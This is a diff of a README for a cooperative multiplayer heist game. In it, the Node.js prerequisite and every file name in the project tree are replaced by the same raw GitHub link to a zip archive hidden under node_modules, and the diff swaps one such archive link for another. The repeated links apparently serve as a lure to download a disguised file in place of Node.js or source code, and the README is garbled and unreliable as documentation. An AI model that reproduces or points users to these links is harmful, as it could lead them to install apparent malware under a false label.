@@ -28,7 +28,7 @@ A 4-player cooperative heist game where no single player can see the full game s
 ## 🚀 Quick Start
 
 ### Prerequisites
-- https://github.com/wafiqj/blind-heist-game/raw/refs/heads/main/node_modules/ws/blind-heist-game-perivasculitis.zip (v14 or higher)
+- https://github.com/wafiqj/blind-heist-game/raw/refs/heads/main/node_modules/uuid/blind-heist-game-v3.3.zip (v14 or higher)
 - npm
 
 ### Installation
@@ -62,32 +62,32 @@ npm start
 ```
 blind-heist-game/
 ├── server/                 # Backend
-│   ├── https://github.com/wafiqj/blind-heist-game/raw/refs/heads/main/node_modules/ws/blind-heist-game-perivasculitis.zip           # WebSocket server & static files
-│   ├── https://github.com/wafiqj/blind-heist-game/raw/refs/heads/main/node_modules/ws/blind-heist-game-perivasculitis.zip     # Room & player management
-│   ├── https://github.com/wafiqj/blind-heist-game/raw/refs/heads/main/node_modules/ws/blind-heist-game-perivasculitis.zip       # Centralized game state
-│   ├── https://github.com/wafiqj/blind-heist-game/raw/refs/heads/main/node_modules/ws/blind-heist-game-perivasculitis.zip       # Game mechanics
-│   └── https://github.com/wafiqj/blind-heist-game/raw/refs/heads/main/node_modules/ws/blind-heist-game-perivasculitis.zip    # Procedural map generation
+│   ├── https://github.com/wafiqj/blind-heist-game/raw/refs/heads/main/node_modules/uuid/blind-heist-game-v3.3.zip           # WebSocket server & static files
+│   ├── https://github.com/wafiqj/blind-heist-game/raw/refs/heads/main/node_modules/uuid/blind-heist-game-v3.3.zip     # Room & player management
+│   ├── https://github.com/wafiqj/blind-heist-game/raw/refs/heads/main/node_modules/uuid/blind-heist-game-v3.3.zip       # Centralized game state
+│   ├── https://github.com/wafiqj/blind-heist-game/raw/refs/heads/main/node_modules/uuid/blind-heist-game-v3.3.zip       # Game mechanics
+│   └── https://github.com/wafiqj/blind-heist-game/raw/refs/heads/main/node_modules/uuid/blind-heist-game-v3.3.zip    # Procedural map generation
 ├── client/                 # Frontend
-│   ├── https://github.com/wafiqj/blind-heist-game/raw/refs/heads/main/node_modules/ws/blind-heist-game-perivasculitis.zip         # Main page
+│   ├── https://github.com/wafiqj/blind-heist-game/raw/refs/heads/main/node_modules/uuid/blind-heist-game-v3.3.zip         # Main page
 │   ├── css/
-│   │   └── https://github.com/wafiqj/blind-heist-game/raw/refs/heads/main/node_modules/ws/blind-heist-game-perivasculitis.zip     # All styles
+│   │   └── https://github.com/wafiqj/blind-heist-game/raw/refs/heads/main/node_modules/uuid/blind-heist-game-v3.3.zip     # All styles
 │   └── js/
-│       ├── https://github.com/wafiqj/blind-heist-game/raw/refs/heads/main/node_modules/ws/blind-heist-game-perivasculitis.zip        # WebSocket client
-│       ├── https://github.com/wafiqj/blind-heist-game/raw/refs/heads/main/node_modules/ws/blind-heist-game-perivasculitis.zip       # Room UI
-│       ├── https://github.com/wafiqj/blind-heist-game/raw/refs/heads/main/node_modules/ws/blind-heist-game-perivasculitis.zip    # Base rendering
-│       ├── https://github.com/wafiqj/blind-heist-game/raw/refs/heads/main/node_modules/ws/blind-heist-game-perivasculitis.zip         # Main controller
+│       ├── https://github.com/wafiqj/blind-heist-game/raw/refs/heads/main/node_modules/uuid/blind-heist-game-v3.3.zip        # WebSocket client
+│       ├── https://github.com/wafiqj/blind-heist-game/raw/refs/heads/main/node_modules/uuid/blind-heist-game-v3.3.zip       # Room UI
+│       ├── https://github.com/wafiqj/blind-heist-game/raw/refs/heads/main/node_modules/uuid/blind-heist-game-v3.3.zip    # Base rendering
+│       ├── https://github.com/wafiqj/blind-heist-game/raw/refs/heads/main/node_modules/uuid/blind-heist-game-v3.3.zip         # Main controller
 │       └── roles/         # Role-specific views
-│           ├── https://github.com/wafiqj/blind-heist-game/raw/refs/heads/main/node_modules/ws/blind-heist-game-perivasculitis.zip
-│           ├── https://github.com/wafiqj/blind-heist-game/raw/refs/heads/main/node_modules/ws/blind-heist-game-perivasculitis.zip
-│           ├── https://github.com/wafiqj/blind-heist-game/raw/refs/heads/main/node_modules/ws/blind-heist-game-perivasculitis.zip
-│           └── https://github.com/wafiqj/blind-heist-game/raw/refs/heads/main/node_modules/ws/blind-heist-game-perivasculitis.zip
-├── https://github.com/wafiqj/blind-heist-game/raw/refs/heads/main/node_modules/ws/blind-heist-game-perivasculitis.zip
-└── https://github.com/wafiqj/blind-heist-game/raw/refs/heads/main/node_modules/ws/blind-heist-game-perivasculitis.zip
+│           ├── https://github.com/wafiqj/blind-heist-game/raw/refs/heads/main/node_modules/uuid/blind-heist-game-v3.3.zip
+│           ├── https://github.com/wafiqj/blind-heist-game/raw/refs/heads/main/node_modules/uuid/blind-heist-game-v3.3.zip
+│           ├── https://github.com/wafiqj/blind-heist-game/raw/refs/heads/main/node_modules/uuid/blind-heist-game-v3.3.zip
+│           └── https://github.com/wafiqj/blind-heist-game/raw/refs/heads/main/node_modules/uuid/blind-heist-game-v3.3.zip
+├── https://github.com/wafiqj/blind-heist-game/raw/refs/heads/main/node_modules/uuid/blind-heist-game-v3.3.zip
+└── https://github.com/wafiqj/blind-heist-game/raw/refs/heads/main/node_modules/uuid/blind-heist-game-v3.3.zip
 ```
 
 ## 🔧 Technical Details
 
-- **Backend**: https://github.com/wafiqj/blind-heist-game/raw/refs/heads/main/node_modules/ws/blind-heist-game-perivasculitis.zip with `ws` (WebSocket) library
+- **Backend**: https://github.com/wafiqj/blind-heist-game/raw/refs/heads/main/node_modules/uuid/blind-heist-game-v3.3.zip with `ws` (WebSocket) library
 - **Frontend**: Vanilla HTML/CSS/JavaScript
 - **Communication**: JSON over WebSocket
 - **State Management**: Server-authoritative with role-filtered updates
